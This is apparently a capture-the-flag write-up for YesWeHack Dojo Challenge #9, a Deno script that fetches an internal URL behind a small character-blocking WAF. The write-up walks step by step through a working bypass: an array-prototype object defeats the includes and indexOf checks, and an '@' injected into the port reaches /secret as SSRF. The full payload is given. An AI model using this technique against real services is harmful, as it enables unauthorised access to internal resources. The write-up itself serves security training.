# YesWeHack Dojo Challenge #9

## Description
In this challenge we're supposed to bypass a WAF, that shall prevent us from accessing a secret. The provided functionality is a simple server side script, that requests an http resource internally.

[Link](https://dojo-yeswehack.com/Playground#eyJkZXNjcmlwdGlvbiI6IiMgWU9VIEN+flN+fkhBTEwgTk9UIFBBU1MgKFRIRSBDT01FQkFDSykgLSBET0pPICM5XG4jIyBDaGFsbFxuXG5fRXZpbENvcnAyLjAgaGFzIHJlY2VpdmVkIHlvdXIgc2VjdXJpdHkgcmVwb3J0cyBhbmQgaGFzIHRoZXJlZm9yZSBkZWNpZGVkIHRvIHJldmlzZSBpdHMgc2NyaXB0IGJ5IGFkZGluZyBuZXcgU1NSRiBwcm90ZWN0aW9ucy4gV291bGQgeW91IGJlIGFibGUgdG8gcmVjb3ZlciB0aGUgc2VjcmV0P19cblxuSWYgeW91IGZpbmQgYSB3YXkgdG8gZ2V0IChhZ2FpbikgdGhlIHNlY3JldCB1c2luZyB0aGlzIHNjcmlwdCwgbGV0IHVzIGtub3chXG5cbiMjIEdvYWxcblxuRmluZCBhIHdheSB0byBieXBhc3MgYWxsIHNlY3VyaXR5IG1lY2hhbmlzbXMgdG8gcmV0cmlldmUgdGhlIGAvc2VjcmV0YC5cblxuKipCUlVURUZPUkNFIElTIE5PVCBBTExPV0VEKioiLCJzb2x1dGlvbiI6bnVsbCwiaGludHMiOltdLCJxdWVyeSI6eyJiYWNrZW5kIjoiRGVubyIsInRlbXBsYXRlIjoiY29uc3QgcGFyYW1zID0gJHBhcmFtc1xuXG5mdW5jdGlvbiBXQUYocykge1xuICBjb25zdCBmb3JiaWRlbiA9IFtcIi9cIiwgXCJcXFxcXCIsIFwiJVwiXVxuICBcbiAgaWYgKEFycmF5LmlzQXJyYXkocykpe1xuICAgIHRocm93IEVycm9yKFwiV0FGOiBTdHJpbmcgZXhwZWN0ZWRcIilcbiAgfVxuICBcbiAgaWYgKGZvcmJpZGVuLnNvbWUoYyA9PiBzLmluY2x1ZGVzKGMpKSkge1xuICAgIHRocm93IEVycm9yKFwiV0FGOiBJbnZhbGlkIGNoYXJcIilcbiAgfVxuICByZXR1cm4gc1xufVxuXG50cnkge1xuICBjb25zdCBwb3J0ID0gV0FGKGA6JHtwYXJhbXMucG9ydCB8fCAnNTAwMCd9YCk7XG4gIGNvbnN0IHBhdGggPSBXQUYocGFyYW1zLnBhdGggfHwgXCJwaW5nXCIpO1xuICBcbiAgXG4gIGlmIChwYXRoLmluZGV4T2YoXCJwaW5nXCIpICE9IDApIHtcbiAgICB0aHJvdyBFcnJvcihcIllvdSBhcmUgb25seSBhbGxvd2VkIHRvIHZpc2l0IC9waW5nXCIpXG4gIH1cbiAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaChgaHR0cDovL2xvY2FsaG9zdCR7cG9ydH0vJHtwYXRofWApXG4gIGNvbnN0IHBvbmcgPSBhd2FpdCByZXNwb25zZS50ZXh0KClcbiAgY29uc29sZS5sb2cocG9uZylcbn0gY2F0Y2ggKGUpIHtcbiAgY29uc29sZS5sb2coZS5tZXNzYWdlKVxufSIsImZpbHRlcnMiOnsiJHBhcmFtcyI6W3siZnVuYyI6Ikpzb25pZnkiLCJhcmdzIjpbXX1dfX19) to the challenge

This is the whole code of the challenge:

``` javascript
const params = $params

function WAF(s) {
  const forbiden = ["/", "\\", "%"]
  
  if (Array.isArray(s)){
    throw Error("WAF: String expected")
  }
  
  if (forbiden.some(c => s.includes(c))) {
    throw Error("WAF: Invalid char")
  }
  return s
}

try {
  const port = WAF(`:${params.port || '5000'}`);
  const path = WAF(params.path || "ping");
  
  
  if (path.indexOf("ping") != 0) {
    throw Error("You are only allowed to visit /ping")
  }
  const response = await fetch(`http://localhost${port}/${path}`)
  const pong = await response.text()
  console.log(pong)
} catch (e) {
  console.log(e.message)
}
```

## Analysis / Exploitation
We, as an attacker, have to inputs, that we can play with:

* The port, that is used for the internal request
* The path, that is used for the internal request
* 
Analysing the source code we can see that both parameters are checked for specific characters, that are forbidden. These are `/`,`\`, `%`

The check for a slash or backslash prevent a simple path-traversal attack. And the percentage prevents any kind of url-encoding bypass.

What we can try is some prototype pollution:

``` javascript
{
  __proto__:
  [
    "ping/../secret"
  ]
}
```

This lets us bypass the WAF check for the path, but fails the next check. But before trying to get around that, let's have a look what happens:

This is the WAF-code:

``` javascript
function WAF(s) {
  const forbiden = ["/", "\\", "%"]

  if (Array.isArray(s)){
    throw Error("WAF: String expected")
  }

  if (forbiden.some(c => s.includes(c))) {
    throw Error("WAF: Invalid char")
  }
  return s
}
```

When this function is called with our path variable, the `Array.isArray(s)` check will pass, because path isn't really an array but an object, that inherits methods and attributes of an array.

The last part of the sentence above is very important, because this is the reason why we can bypass the second check of the WAF too: For every character in `forbiden`, the `includes`-function of our path is called. But that's not the intended `String.prototype.includes` call, but `Array.prototype.includes`. So this would only be true, if one of the strings in our array would be equal to the character that is checked. Something like

``` javascript
{
  __proto__:
  [
    "/"
  ]
}
```

Well, now we have a way to bypass the WAF. But there's another check to pass:

``` javascript
if (path.indexOf("ping") != 0) {
    throw Error("You are only allowed to visit /ping")
}
```

Lucky us that there is also an `Array.prototype.indexOf`. So we can change our payload to

``` javascript
{
  __proto__:
  [
    "ping",
    "ping/../secret"
  ]
}
```

, pass the check and fetch `http://localhost:5000/path,path/../secret`

Unfortunately, there is another security measure as this payload returns _"You can't access the flag from \"localhost\", try something else."_ 

That means we have to find a way to access localhost without calling it localhost. Looking at the initialization and usage of the port-part, we see this:

``` javascript
const port = WAF(`:${params.port || '5000'}`);
...
const response = await fetch(`http://localhost${port}/${path}`)
```

So our input is prefixed with a colon and then appended to localhost. The WAF only checks the three characters, so this is our chance to mess with the authority part of the URL that will be fetched. Introducing an `@` we can provide our very own host and port part:

``` javascript
const params = {
  "port": "5000@0:5000",
  "path": {
    "__proto__": [
      "ping",
      "ping\/..\/secret"
    ]
  }
}
```
bypasses the WAF, the `indexOf`-check and uses the following URL to grab and return the secret:

`http://localhost:5000@0:5000/ping,ping/../secret`
